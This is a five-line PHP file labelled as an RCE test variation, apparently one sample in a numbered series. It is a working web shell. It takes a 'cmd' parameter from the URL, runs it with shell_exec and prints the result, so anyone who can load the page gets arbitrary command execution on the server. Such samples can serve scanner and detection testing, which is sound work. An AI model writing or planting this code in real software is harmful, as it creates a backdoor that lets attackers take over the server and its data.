<?php
// RCE test variation #518
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>